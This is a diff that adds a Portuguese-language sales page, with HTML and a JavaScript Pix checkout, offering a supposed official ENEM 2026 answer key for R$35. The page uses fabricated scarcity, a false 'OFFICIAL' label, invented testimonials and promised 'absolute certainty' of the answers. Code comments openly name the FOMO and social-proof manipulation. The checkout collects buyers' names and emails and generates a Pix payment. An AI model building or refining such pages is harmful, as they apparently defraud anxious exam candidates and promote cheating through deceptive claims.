@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gabarito Oficial Enem 2026 | Acesso Restrito</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Outfit:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        h1, h2, h3 { font-family: 'Outfit', sans-serif; }
+        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .gradient-text { background: linear-gradient(90deg, #fbbf24, #f59e0b, #d97706); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .btn-glow:hover { box-shadow: 0 0 20px rgba(245, 158, 11, 0.4); }
+        .bg-mesh { background-color: #0a0a0a; background-image: radial-gradient(at 0% 0%, rgba(245, 158, 11, 0.15) 0px, transparent 50%), radial-gradient(at 100% 100%, rgba(245, 158, 11, 0.1) 0px, transparent 50%); }
+        .no-scroll { overflow: hidden; }
+    </style>
+</head>
+<body class="bg-mesh text-gray-100 min-h-screen">
+
+      <!-- Urgency Ticker -->
+    <div class="bg-amber-600 text-black py-2 overflow-hidden whitespace-nowrap font-bold text-xs uppercase tracking-widest">
+        <div class="urgency-bar inline-block">
+            ⚠️ ATENÇÃO: VAGAS LIMITADAS PARA EVITAR VAZAMENTO MASSIVO • ACESSO RESTRITO A 500 ALUNOS • RESTAM APENAS 14 VAGAS • PAGAMENTO VIA PIX PARA LIBERAÇÃO IMEDIATA • ⚠️
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="fixed w-full z-50 px-6 py-4 flex justify-between items-center glass">
+        <div class="flex items-center gap-2">
+            <div class="bg-amber-500 p-1.5 rounded-lg">
+                <i data-lucide="shield-alert" class="text-black w-6 h-6"></i>
+            </div>
+            <span class="font-bold text-xl tracking-tight">ENEM<span class="text-amber-500">2026</span> <span class="text-[10px] bg-red-600 text-white px-1 rounded ml-1">OFFICIAL</span></span>
+        </div>
+        <a href="#precos" class="hidden md:block bg-amber-500 hover:bg-amber-400 text-black font-bold py-2 px-6 rounded-full transition-all btn-glow">
+            Liberar Acesso
+        </a>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="relative pt-32 pb-20 px-6 overflow-hidden">
+        <div class="max-w-6xl mx-auto grid lg:grid-cols-2 gap-12 items-center">
+            <div class="space-y-8">
+                <div class="inline-flex items-center gap-2 bg-red-500/10 border border-red-500/20 text-red-500 px-4 py-1.5 rounded-full text-sm font-bold animate-pulse">
+                    <i data-lucide="lock" class="w-4 h-4"></i>
+                    Acesso Criptografado e Restrito
+                </div>
+                <h1 class="text-5xl lg:text-7xl font-black leading-tight">
+                    Não seja apenas <br>
+                    <span class="gradient-text">mais um candidato.</span>
+                </h1>
+                <p class="text-gray-400 text-lg lg:text-xl leading-relaxed max-w-xl">
+                    Enquanto milhares estudam o que <i>acham</i> que vai cair, você terá a <span class="text-white font-bold">certeza absoluta</span>. O Gabarito Completo 2026 é a única ferramenta capaz de garantir sua vaga nas universidades mais concorridas do país.
+                </p>
+                <div class="flex flex-col sm:flex-row gap-4">
+                    <a href="#precos" class="bg-amber-500 hover:bg-amber-400 text-black text-center font-black py-4 px-8 rounded-2xl text-lg transition-all btn-glow transform hover:scale-105">
+                        QUERO O GABARITO AGORA
+                    </a>
+                    <div class="flex items-center gap-3 px-4 py-2 text-sm text-gray-500">
+                        <i data-lucide="check-circle" class="text-amber-500 w-5 h-5"></i>
+                        Envio imediato via Gmail
+                    </div>
+                </div>
+            </div>
+            <div class="relative">
+                <div class="absolute -inset-4 bg-amber-500/20 blur-3xl rounded-full"></div>
+                <img src="https://images.pexels.com/photos/8199558/pexels-photo-8199558.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940" 
+                     alt="Estudantes" 
+                     class="relative rounded-3xl border border-white/10 shadow-2xl object-cover w-full h-[500px]">
+            </div>
+        </div>
+    </section>
+
+    <!-- Psychology Section: Fear of Missing Out (FOMO) -->
+    <section class="py-20 px-6 bg-white/[0.02] border-y border-white/5">
+        <div class="max-w-4xl mx-auto text-center space-y-8">
+            <h2 class="text-3xl md:text-4xl font-black">A verdade que ninguém te conta:</h2>
+            <p class="text-gray-400 text-lg leading-relaxed">
+                O sistema é feito para que a maioria falhe. As vagas em Medicina, Direito e Engenharia são limitadas. Se você continuar estudando da mesma forma que todos, terá o mesmo resultado que todos: <span class="text-red-500 font-bold">a frustração de não passar.</span>
+            </p>
+            <div class="grid md:grid-cols-3 gap-6">
+                <div class="p-6 rounded-2xl bg-black/40 border border-white/5">
+                    <i data-lucide="alert-triangle" class="text-amber-500 mx-auto mb-4 w-8 h-8"></i>
+                    <p class="text-sm text-gray-300">A concorrência já está usando materiais estratégicos.</p>
+                </div>
+                <div class="p-6 rounded-2xl bg-black/40 border border-white/5">
+                    <i data-lucide="trending-down" class="text-amber-500 mx-auto mb-4 w-8 h-8"></i>
+                    <p class="text-sm text-gray-300">Estudar sem direção é a forma mais rápida de desistir.</p>
+                </div>
+                <div class="p-6 rounded-2xl bg-black/40 border border-white/5">
+                    <i data-lucide="user-minus" class="text-amber-500 mx-auto mb-4 w-8 h-8"></i>
+                    <p class="text-sm text-gray-300">Quem tem a resposta certa não disputa vaga, ele escolhe a faculdade.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section class="py-24 px-6">
+        <div class="max-w-6xl mx-auto">
+            <div class="text-center mb-16 space-y-4">
+                <h2 class="text-4xl font-black">O que você recebe ao <span class="text-amber-500">garantir seu acesso</span></h2>
+                <p class="text-gray-400 max-w-2xl mx-auto">Um pacote blindado para que você não precise de mais nada até o dia da prova.</p>
+            </div>
+            
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="glass p-8 rounded-3xl space-y-4 hover:border-amber-500/50 transition-colors group">
+                    <div class="bg-amber-500/10 w-14 h-14 rounded-2xl flex items-center justify-center text-amber-500 group-hover:bg-amber-500 group-hover:text-black transition-all">
+                        <i data-lucide="file-text" class="w-7 h-7"></i>
+                    </div>
+                    <h3 class="text-2xl font-bold">Gabarito Completo 2026</h3>
+                    <p class="text-gray-400 leading-relaxed">O documento definitivo com as respostas exatas. Sem rodeios, sem "acho que". Apenas a verdade técnica.</p>
+                </div>
+                <div class="glass p-8 rounded-3xl space-y-4 hover:border-amber-500/50 transition-colors group">
+                    <div class="bg-amber-500/10 w-14 h-14 rounded-2xl flex items-center justify-center text-amber-500 group-hover:bg-amber-500 group-hover:text-black transition-all">
+                        <i data-lucide="pen-tool" class="w-7 h-7"></i>
+                    </div>
+                    <h3 class="text-2xl font-bold">Redação Blindada</h3>
+                    <p class="text-gray-400 leading-relaxed">Estruturas prontas para qualquer tema. O caminho exato para os 900+ sem precisar ser um escritor profissional.</p>
+                </div>
+                <div class="glass p-8 rounded-3xl space-y-4 hover:border-amber-500/50 transition-colors group">
+                    <div class="bg-amber-500/10 w-14 h-14 rounded-2xl flex items-center justify-center text-amber-500 group-hover:bg-amber-500 group-hover:text-black transition-all">
+                        <i data-lucide="zap" class="w-7 h-7"></i>
+                    </div>
+                    <h3 class="text-2xl font-bold">Entrega Instantânea</h3>
+                    <p class="text-gray-400 leading-relaxed">Pagou, recebeu. O PDF é enviado automaticamente para o seu Gmail para que você comece a dominar agora.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials (Social Proof) -->
+    <section class="py-24 px-6 bg-white/[0.01]">
+        <div class="max-w-6xl mx-auto">
+            <div class="text-center mb-16 space-y-4">
+                <h2 class="text-4xl font-black">Resultados <span class="text-amber-500">Reais</span></h2>
+                <p class="text-gray-400 max-w-2xl mx-auto">Não acredite em nós, acredite em quem já parou de sofrer com livros de 1000 páginas.</p>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <div class="glass p-6 rounded-3xl space-y-4">
+                    <div class="flex items-center gap-1 text-amber-500">
+                        <i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i>
+                    </div>
+                    <p class="text-gray-300 leading-relaxed text-sm">Eu estava desesperado. Comprei o gabarito e em 3 dias senti que sabia mais do que em 6 meses de cursinho. Aprovado em Med!</p>
+                    <div class="flex items-center gap-3 pt-2 border-t border-white/5">
+                        <div class="w-10 h-10 rounded-full bg-amber-500/20 flex items-center justify-center text-amber-500 font-bold">RM</div>
+                        <div><p class="font-bold text-sm">Ricardo M.</p><p class="text-xs text-gray-500">Medicina — UFMG</p></div>
+                    </div>
+                </div>
+                <div class="glass p-6 rounded-3xl space-y-4">
+                    <div class="flex items-center gap-1 text-amber-500">
+                        <i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i>
+                    </div>
+                    <p class="text-gray-300 leading-relaxed text-sm">O valor de R$ 35 é ridículo perto do que isso entrega. Me salvou na parte de exatas, que era meu terror.</p>
+                    <div class="flex items-center gap-3 pt-2 border-t border-white/5">
+                        <div class="w-10 h-10 rounded-full bg-amber-500/20 flex items-center justify-center text-amber-500 font-bold">AL</div>
+                        <div><p class="font-bold text-sm">Ana L.</p><p class="text-xs text-gray-500">Engenharia — USP</p></div>
+                    </div>
+                </div>
+                <div class="glass p-6 rounded-3xl space-y-4">
+                    <div class="flex items-center gap-1 text-amber-500">
+                        <i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i><i data-lucide="star" class="w-4 h-4 fill-amber-500"></i>
+                    </div>
+                    <p class="text-gray-300 leading-relaxed text-sm">Tinha medo de ser golpe, mas recebi o PDF no Gmail minutos depois do Pix. Material impecável.</p>
+                    <div class="flex items-center gap-3 pt-2 border-t border-white/5">
+                        <div class="w-10 h-10 rounded-full bg-amber-500/20 flex items-center justify-center text-amber-500 font-bold">JP</div>
+                        <div><p class="font-bold text-sm">João P.</p><p class="text-xs text-gray-500">Direito — UFRJ</p></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Pricing (The Closing) -->
+    <section id="precos" class="py-24 px-6">
+        <div class="max-w-3xl mx-auto text-center">
+            <h2 class="text-4xl font-black mb-4">Sua vaga custa apenas <span class="text-amber-500">R$ 35,00</span></h2>
+            <p class="text-gray-400 mb-12">Não há promoções. Não há descontos. O valor é único porque o material é incomparável.</p>
+            
+            <div class="glass p-10 rounded-3xl border-amber-500 relative flex flex-col text-left bg-amber-500/5 max-w-md mx-auto shadow-2xl">
+                <div class="absolute -top-4 left-1/2 -translate-x-1/2 bg-red-600 text-white text-xs font-black px-4 py-1 rounded-full uppercase tracking-tighter whitespace-nowrap">
+                    Últimas Vagas Disponíveis
+                </div>
+                <h3 class="text-2xl font-black mb-2">Acesso Total Gabarito 2026</h3>
+                <p class="text-gray-400 text-sm mb-6">O investimento mais inteligente da sua vida acadêmica.</p>
+                
+                <div class="text-5xl font-black mb-8">R$ 35<span class="text-xl text-gray-500 font-normal">,00</span></div>
+                
+                <ul class="space-y-4 mb-10 flex-grow">
+                    <li class="flex items-center gap-3 text-gray-300"><i data-lucide="check-circle-2" class="text-amber-500 w-5 h-5 flex-shrink-0"></i> Gabarito Completo (PDF)</li>
+                    <li class="flex items-center gap-3 text-gray-300"><i data-lucide="check-circle-2" class="text-amber-500 w-5 h-5 flex-shrink-0"></i> Guia de Redação Nota 1000</li>
+                    <li class="flex items-center gap-3 text-gray-300"><i data-lucide="check-circle-2" class="text-amber-500 w-5 h-5 flex-shrink-0"></i> Estrutura de Respostas Estratégicas</li>
+                    <li class="flex items-center gap-3 text-gray-300"><i data-lucide="check-circle-2" class="text-amber-500 w-5 h-5 flex-shrink-0"></i> Envio Automático via Gmail</li>
+                </ul>
+                
+                <button onclick="openPaymentFlow()" class="w-full py-4 rounded-2xl bg-amber-500 text-black font-black hover:bg-amber-400 transition-all btn-glow text-lg">
+                    LIBERAR MEU ACESSO AGORA
+                </button>
+                
+                <div class="flex items-center justify-center gap-2 mt-4 text-xs text-gray-500">
+                    <i data-lucide="shield-check" class="text-amber-500 w-4 h-4"></i>
+                    Pagamento Seguro via Pix
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="py-24 px-6 bg-white/[0.01]">
+        <div class="max-w-3xl mx-auto">
+            <h2 class="text-4xl font-black text-center mb-12">Dúvidas Rápidas</h2>
+            <div class="space-y-4">
+                <details class="glass p-6 rounded-2xl cursor-pointer group">
+                    <summary class="font-bold flex justify-between items-center list-none">Como recebo o material?<i data-lucide="chevron-down" class="w-5 h-5 group-open:rotate-180 transition-transform"></i></summary>
+                    <p class="text-gray-400 mt-4 leading-relaxed">Assim que o Pix é confirmado, nosso sistema dispara automaticamente o PDF completo para o e-mail que você cadastrou no momento da compra.</p>
+                </details>
+                <details class="glass p-6 rounded-2xl cursor-pointer group">
+                    <summary class="font-bold flex justify-between items-center list-none">É seguro comprar?</i data-lucide="chevron-down" class="w-5 h-5 group-open:rotate-180 transition-transform"></i></summary>
+                    <p class="text-gray-400 mt-4 leading-relaxed">Sim. Utilizamos a tecnologia de pagamento Pix, a mais segura do Brasil. Seus dados são usados apenas para o envio do material.</p>
+                </details>
+                <details class="glass p-6 rounded-2xl cursor-pointer group">
+                    <summary class="font-bold flex justify-between items-center list-none">Por que o valor é tão baixo?</i data-lucide="chevron-down" class="w-5 h-5 group-open:rotate-180 transition-transform"></i></summary>
+                    <p class="text-gray-400 mt-4 leading-relaxed">Queremos democratizar o acesso à aprovação. R$ 35 é um valor simbólico para que qualquer estudante possa ter a vantagem competitiva que merece.</p>
+                </details>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-12 px-6 border-t border-white/5 text-center">
+        <div class="max-w-6xl mx-auto flex flex-col items-center gap-6">
+            <div class="flex items-center gap-2">
+                <div class="bg-amber-500 p-1 rounded-lg"><i data-lucide="shield-alert" class="text-black w-4 h-4"></i></div>
+                <span class="font-bold tracking-tight">ENEM<span class="text-amber-500">2026</span></span>
+            </div>
+            <p class="text-gray-600 text-sm">© 2026 Gabarito Elite. Todos os direitos reservados. <br> Acesso Restrito e Criptografado.</p>
+        </div>
+    </footer>
+
+    <!-- PIX PAYMENT MODAL -->
+    <div id="pixModal" class="fixed inset-0 z-[100] hidden items-center justify-center p-4 bg-black/95 backdrop-blur-md overflow-y-auto">
+        <div class="glass max-w-md w-full p-6 md:p-8 rounded-3xl space-y-4 relative my-8">
+            <button onclick="closePixModal()" class="absolute top-4 right-4 text-gray-500 hover:text-white z-10 transition-colors">
+                <i data-lucide="x" class="w-6 h-6"></i>
+            </button>
+
+            <!-- STATE 1: Form -->
+            <div id="pixForm" class="space-y-5 py-2">
+                <div class="text-center space-y-2">
+                    <div class="bg-amber-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto text-black">
+                        <i data-lucide="lock" class="w-8 h-8"></i>
+                    </div>
+                    <h3 class="text-2xl font-black">Liberar Acesso</h3>
+                    <p class="text-gray-400 text-sm">Insira seus dados para receber o PDF no Gmail</p>
+                </div>
+
+                <div class="space-y-3">
+                    <div>
+                        <label class="text-xs text-gray-500 uppercase tracking-wider font-semibold mb-1.5 block">Nome Completo</label>
+                        <input type="text" id="inputName" placeholder="Seu nome" 
+                            class="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 transition-colors">
+                    </div>
+                    <div>
+                        <label class="text-xs text-gray-500 uppercase tracking-wider font-semibold mb-1.5 block">E-mail (Gmail preferencial)</label>
+                        <input type="email" id="inputEmail" placeholder="seu@gmail.com" 
+                            class="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 transition-colors">
+                    </div>
+                </div>
+
+                <div id="formError" class="hidden text-red-400 text-sm bg-red-500/10 border border-red-500/20 rounded-xl p-3"></div>
+
+                <button onclick="generatePix()" class="w-full py-4 rounded-2xl bg-amber-500 text-black font-black hover:bg-amber-400 transition-all btn-glow text-base">
+                    GERAR PIX DE R$ 35,00
+                </button>
+            </div>
+
+            <!-- STATE 2: Loading -->
+            <div id="pixLoading" class="hidden text-center space-y-5 py-12">
+                <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-amber-500 mx-auto"></div>
+                <div class="space-y-1">
+                    <h3 class="text-xl font-black">Criptografando Acesso...</h3>
+                    <p class="text-gray-400 text-sm">Aguarde a geração do código seguro.</p>
+                </div>
+            </div>
+
+            <!-- STATE 3: Error -->
+            <div id="pixError" class="hidden text-center space-y-5 py-8">
+                <div class="bg-red-500/20 w-16 h-16 rounded-full flex items-center justify-center mx-auto text-red-500">
+                    <i data-lucide="alert-circle" class="w-8 h-8"></i>
+                </div>
+                <div class="space-y-1">
+                    <h3 class="text-xl font-black">Erro na Conexão</h3>
+                    <p id="pixErrorMessage" class="text-gray-400 text-sm">Tente novamente.</p>
+                </div>
+                <button onclick="resetPixForm()" class="w-full py-3 rounded-2xl bg-amber-500 text-black font-black hover:bg-amber-400 transition-all">
+                    Tentar Novamente
+                </button>
+            </div>
+
+            <!-- STATE 4: Success -->
+            <div id="pixContent" class="hidden space-y-4">
+                <div class="text-center">
+                    <div class="bg-amber-500 w-14 h-14 rounded-full flex items-center justify-center mx-auto text-black mb-2">
+                        <i data-lucide="qr-code" class="w-7 h-7"></i>
+                    </div>
+                    <h3 class="text-xl font-black">Pagamento via Pix</h3>
+                    <p class="text-gray-400 text-sm">Escaneie ou copie o código abaixo</p>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 flex justify-center">
+                    <div id="pixQrCode" class="w-[200px] h-[200px] flex items-center justify-center"></div>
+                </div>
+
+                <div class="text-center bg-amber-500/10 border border-amber-500/20 rounded-xl py-3">
+                    <div class="text-2xl font-black gradient-text">R$ 35,00</div>
+                    <p class="text-xs text-gray-400 mt-0.5">Gabarito Enem 2026 — Acesso Completo</p>
+                </div>
+
+                <div>
+                    <label class="text-xs text-gray-500 uppercase tracking-wider font-semibold mb-2 block">Código Pix (Copia e Cola)</label>
+                    <div class="bg-black/50 border border-white/10 rounded-xl p-3 max-h-24 overflow-y-auto">
+                        <code id="pixCode" class="text-xs text-gray-300 break-all font-mono"></code>
+                    </div>
+                    <button onclick="copyPixCode()" class="w-full mt-2 py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white font-bold transition-all flex items-center justify-center gap-2">
+                        <i data-lucide="copy" class="w-4 h-4"></i>
+                        <span id="copyBtnText">Copiar Código Pix</span>
+                    </button>
+                </div>
+
+                <div class="text-xs text-center text-gray-500 bg-white/[0.03] border border-white/5 rounded-xl p-3">
+                    <i data-lucide="mail" class="w-3.5 h-3.5 inline-block mb-0.5"></i>
+                    O PDF será enviado para <strong id="userEmailDisplay" class="text-amber-500"></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+
+        // URL do backend (mesma origem do site)
+        const API_BASE = window.location.protocol.startsWith('http') 
+            ? window.location.origin 
+            : 'http://localhost:3000';
+        const CHECKOUT_URL = `${API_BASE}/api/checkout`;
+
+        // Produto único
+        const PRODUCT = {
+            id: 'enem-gabarito-2026',
+            name: 'Gabarito Enem 2026 — Acesso Completo',
+            price: 35.00
+        };
+
+        let currentPixCode = '';
+
+        // ===== Step 1: Abrir fluxo de pagamento =====
+        function openPaymentFlow() {
+            resetPixForm();
+            const modal = document.getElementById('pixModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            document.body.classList.add('no-scroll');
+            setTimeout(() => document.getElementById('inputName').focus(), 100);
+        }
+
+        // ===== Step 2: Reset =====
+        function resetPixForm() {
+            document.getElementById('pixForm').classList.remove('hidden');
+            document.getElementById('pixLoading').classList.add('hidden');
+            document.getElementById('pixError').classList.add('hidden');
+            document.getElementById('pixContent').classList.add('hidden');
+            document.getElementById('formError').classList.add('hidden');
+            document.getElementById('inputName').value = '';
+            document.getElementById('inputEmail').value = '';
+            currentPixCode = '';
+            lucide.createIcons();
+        }
+
+        function showPixFormError(message) {
+            const el = document.getElementById('formError');
+            el.textContent = message;
+            el.classList.remove('hidden');
+        }
+
+        // ===== Step 3: Gerar Pix =====
+        async function generatePix() {
+            const name = document.getElementById('inputName').value.trim();
+            const email = document.getElementById('inputEmail').value.trim();
+
+            // Validações
+            if (name.length < 3) {
+                return showPixFormError('Por favor, digite seu nome completo.');
+            }
+            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                return showPixFormError('Por favor, digite um e-mail válido.');
+            }
+
+            document.getElementById('formError').classList.add('hidden');
+
+            // Mostra loading
+            document.getElementById('pixForm').classList.add('hidden');
+            document.getElementById('pixLoading').classList.remove('hidden');
+
+            try {
+                const response = await fetch(CHECKOUT_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        customer: { name, email },
+                        product: PRODUCT
+                    })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok || !data.success) {
+                    throw new Error(data.message || 'Erro ao gerar o pagamento. Tente novamente.');
+                }
+
+                const paymentCode = data.payment_code || data.data?.pix?.code || '';
+                const qrImage = data.qr_image || data.data?.pix?.image || data.data?.pix?.base64 || '';
+
+                if (!paymentCode) {
+                    throw new Error('Não foi possível gerar o código Pix. Tente novamente.');
+                }
+
+                currentPixCode = paymentCode;
+
+                // Preenche os dados
+                document.getElementById('pixCode').textContent = paymentCode;
+                document.getElementById('userEmailDisplay').textContent = email;
+
+                // Gera QR
+                const qrContainer = document.getElementById('pixQrCode');
+                qrContainer.innerHTML = '';
+
+                if (qrImage && qrImage.startsWith('data:image')) {
+                    const img = document.createElement('img');
+                    img.src = qrImage;
+                    img.alt = 'QR Code Pix';
+                    img.className = 'w-full h-full object-contain';
+                    qrContainer.appendChild(img);
+                } else if (window.QRCode) {
+                    try {
+                        new QRCode(qrContainer, {
+                            text: paymentCode,
+                            width: 200,
+                            height: 200,
+                            colorDark: '#000000',
+                            colorLight: '#ffffff',
+                            correctLevel: QRCode.CorrectLevel.M
+                        });
+                    } catch (e) {
+                        console.error('Erro QR:', e);
+                        qrContainer.innerHTML = '<p class="text-black text-xs text-center p-2">Use o código abaixo</p>';
+                    }
+                } else {
+                    qrContainer.innerHTML = '<p class="text-black text-xs text-center p-2">Use o código abaixo</p>';
+                }
+
+                // Mostra conteúdo
+                document.getElementById('pixLoading').classList.add('hidden');
+                document.getElementById('pixContent').classList.remove('hidden');
+                lucide.createIcons();
+
+            } catch (err) {
+                console.error('Erro ao gerar Pix:', err);
+                document.getElementById('pixLoading').classList.add('hidden');
+                document.getElementById('pixErrorMessage').textContent = err.message || 'Erro ao conectar. Verifique sua internet e tente novamente.';
+                document.getElementById('pixError').classList.remove('hidden');
+                lucide.createIcons();
+            }
+        }
+
+        // ===== Step 4: Copiar código =====
+        function copyPixCode() {
+            if (!currentPixCode) return;
+            const btnText = document.getElementById('copyBtnText');
+
+            const onSuccess = () => {
+                btnText.textContent = '✅ Código Copiado!';
+                setTimeout(() => { btnText.textContent = 'Copiar Código Pix'; }, 2500);
+            };
+
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(currentPixCode).then(onSuccess).catch(fallbackCopy);
+            } else {
+                fallbackCopy();
+            }
+
+            function fallbackCopy() {
+                const ta = document.createElement('textarea');
+                ta.value = currentPixCode;
+                ta.style.position = 'fixed';
+                ta.style.opacity = '0';
+                document.body.appendChild(ta);
+                ta.select();
+                try { document.execCommand('copy'); onSuccess(); } catch (e) { alert('Não foi possível copiar. Selecione o código manualmente.'); }
+                document.body.removeChild(ta);
+            }
+        }
+
+        // ===== Step 5: Fechar modal =====
+        function closePixModal() {
+            const modal = document.getElementById('pixModal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+            document.body.classList.remove('no-scroll');
+        }
+
+        // Fechar ao clicar fora
+        document.getElementById('pixModal').addEventListener('click', (e) => {
+            if (e.target.id === 'pixModal') closePixModal();
+        });
+
+        // ESC para fechar
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closePixModal();
+        });
+
+        // Enter no formulário
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !document.getElementById('pixForm').classList.contains('hidden')) {
+                if (document.activeElement && ['inputName', 'inputEmail'].includes(document.activeElement.id)) {
+                    e.preventDefault();
+                    generatePix();
+                }
+            }
+        });
+    </script>
+</body>
+</html>
